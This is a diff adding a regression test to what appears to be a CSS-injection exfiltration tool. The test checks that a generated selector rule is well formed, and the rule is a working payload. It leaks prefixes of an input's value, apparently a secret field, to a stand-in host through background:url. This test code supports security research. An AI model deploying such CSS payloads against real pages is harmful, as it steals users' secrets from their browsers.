@@ -115,6 +115,19 @@ class TestRecursiveNextPayload:
         assert "input[value^='aba']" in css
         assert '/v?t=aba&cid=1' in css
 
+    def test_next_payload_extraction_selector_is_well_formed(self, make_client: ClientFactory) -> None:
+        """Regression: each extraction rule must close its :has() and apply the
+        :first-child depth *outside* it, exactly like the completeness rule.
+        A missing ')' here produced invalid CSS that browsers silently dropped."""
+        c = self._client_with_history(make_client)
+        css = RecursiveStrategy(hostname='h', port=9, element='input', attribute='value').generate_next_payload(c)
+        rule = (
+            "html:has(input[value^='ab0']:not(input[value='admin'])):first-child:first-child"
+            '{background:url("//h:9/v?t=ab0&cid=1");}'
+        )
+        assert rule in css
+        assert rule.count('(') == rule.count(')')
+
     def test_next_payload_url_encodes_probe_values(self, make_client: ClientFactory) -> None:
         c = self._client_with_history(make_client)
         css = RecursiveStrategy(hostname='h', port=9).generate_next_payload(c)
